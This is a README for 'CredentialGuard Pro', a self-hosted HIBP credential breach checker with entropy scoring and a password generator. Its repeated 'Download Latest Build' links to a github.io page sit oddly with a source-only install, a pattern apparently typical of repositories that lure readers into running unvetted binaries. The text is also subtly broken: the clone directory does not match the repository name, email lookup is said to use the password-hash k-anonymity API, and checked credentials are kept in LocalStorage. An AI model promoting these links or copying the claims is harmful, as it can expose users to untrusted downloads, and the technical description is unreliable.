# CredentialGuard Pro - credential breach checker 2026

> A complete credential breach checking stack built around k-anonymity and SHA-1 hash prefixes to query HIBP through a privacy-preserving proxy, with entropy scoring, crack-time estimates, and secure password generation included.

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/carterwxpparker4365/credentialguard-breach-lookup?style=flat-square)](https://github.com/carterwxpparker4365/credentialguard-breach-lookup)

---

<p align="center">
  <a href="https://carterwxpparker4365.github.io/credentialguard-breach-lookup/">
    <img src="https://img.shields.io/badge/Download-CredentialGuard%20Pro%20Latest-brightgreen?style=for-the-badge" alt="Download CredentialGuard Pro">
  </a>
</p>

> **[Direct Download - CredentialGuard Pro v1.0.0](https://carterwxpparker4365.github.io/credentialguard-breach-lookup/)**

---

[Download Latest Build](https://carterwxpparker4365.github.io/credentialguard-breach-lookup/)

---

## Overview

CredentialGuard Pro is a self-hosted credential exposure checker made with FastAPI and plain JavaScript. It lets users and security teams test whether passwords, emails, or usernames show up in known breaches, while avoiding disclosure of the complete credential to any external service. Its k-anonymity flow sends only a SHA-1 hash prefix to the Have I Been Pwned API, so the original password or email stays private end to end.

The project is aimed at anyone who wants a practical way to manage credential risk without handing data to a third party. Whether you are an administrator reviewing employee accounts or an individual checking your own exposure, CredentialGuard Pro runs on your own infrastructure and can be deployed with Docker. With entropy evaluation, crack-time prediction, and an integrated password generator, it acts as a broader password health and exposure dashboard instead of a single-purpose lookup page.

---

## Capabilities

- **Password Check with Entropy & Strength Scoring** - Assess password quality with entropy analysis and a straightforward strength rating.
- **Password Generator with Crack-Time Estimation** - Create cryptographically secure passwords and estimate how long they would take to crack across different attack models.
- **Email Breach Lookup** - Determine whether an email address is present in known breaches using the same k-anonymity method.
- **Username Multi-Source Lookup** - Look up compromised usernames across several breach sources.
- **Dark/Light Mode** - Switch themes for easier viewing in different environments.
- **Check History via LocalStorage** - Browse previous credential checks saved locally in your browser, with no server-side logging.
- **Health Dashboard** - View system status, API connectivity, and rate limit usage in one place.
- **Docker One-Command Deployment** - Start the full stack with a single Docker command, including the FastAPI backend and static frontend.
- **Sliding-Window Rate Limiting** - Limit abuse with configurable per-IP throttling that refreshes over time.

---

## Getting Started

Clone the repository from GitHub:

```bash
git clone https://github.com/carterwxpparker4365/credentialguard-breach-lookup.git
cd credentialguard-pro
```

For Docker deployment, run the following command:

```bash
docker-compose up --build
```

For manual installation, set up a Python virtual environment and install dependencies:

```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r requirements.txt
uvicorn app.main:app --reload
```

The application will be available at `http://localhost:8000`.

---

## How to Use

1. **Password Check** - Open the password checking area, type in a password, and review the entropy score, strength result, and breach status.
2. **Email Lookup** - Submit an email address to check whether it appears in any known breaches. The k-anonymity design ensures that only a partial hash is transmitted.
3. **Username Search** - Enter a username and search for it across multiple breach databases.
4. **Password Generator** - Choose length and character options, then generate a secure password together with an estimated crack time.
5. **View History** - Open the history panel to inspect previously checked credentials saved in your browser's LocalStorage.
6. **Health Dashboard** - Check API status, rate limit counters, and system health metrics on the dashboard.

---

## Configuration

All tunable settings live in a `.env` file at the project root. Important options include:

- `RATE_LIMIT_WINDOW` - Duration in seconds for the sliding window (default: 60)
- `RATE_LIMIT_MAX_REQUESTS` - Maximum requests allowed per window (default: 30)
- `SECRET_KEY` - Used for session management and CSRF protection
- `HIBP_API_KEY` - Optional API key for increased HIBP rate limits

The application also accepts environment variables for Docker-based deployments. You can change settings without rebuilding the container by supplying environment variables in `docker-compose.yml`.

---

## Requirements

- **Platform**: Python 3.9+
- **Runtime**: FastAPI, Uvicorn
- **Storage**: LocalStorage in browser (no server-side database required)
- **Docker**: Docker Engine 20.10+ with Docker Compose v2+ (for containerized deployment)
- **Browser**: Modern browser with JavaScript enabled (Chrome, Firefox, Edge, Safari)
- **Network**: Outbound HTTPS access to `api.pwnedpasswords.com` for breach lookups

---

## FAQ

**How does the k-anonymity architecture protect my credentials?**  
When a password is checked, CredentialGuard Pro sends only the first five characters of its SHA-1 hash to the HIBP API. The service returns matching hash suffixes for that prefix, and the comparison happens locally. As a result, your full password or hash never leaves your device.

**Can I use this without Docker?**  
Yes. It runs as a normal FastAPI application. You can install the Python dependencies manually and launch it with Uvicorn as described in the installation section.

**How often is the breach database updated?**  
CredentialGuard Pro uses the HIBP API, which is refreshed regularly as breaches are found and disclosed. The application does not store or maintain its own breach dataset.

**Is there a way to clear my check history?**  
Check history is kept in your browser's LocalStorage. You can remove it through browser developer tools or by using the clear history action in the application's settings panel.

**What should I do if I encounter rate limiting?**  
The sliding-window limiter is there to stop abuse. If you reach the limit, wait for the window to reset (default 60 seconds). For heavier usage, adjust `RATE_LIMIT_MAX_REQUESTS` in your `.env` file.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
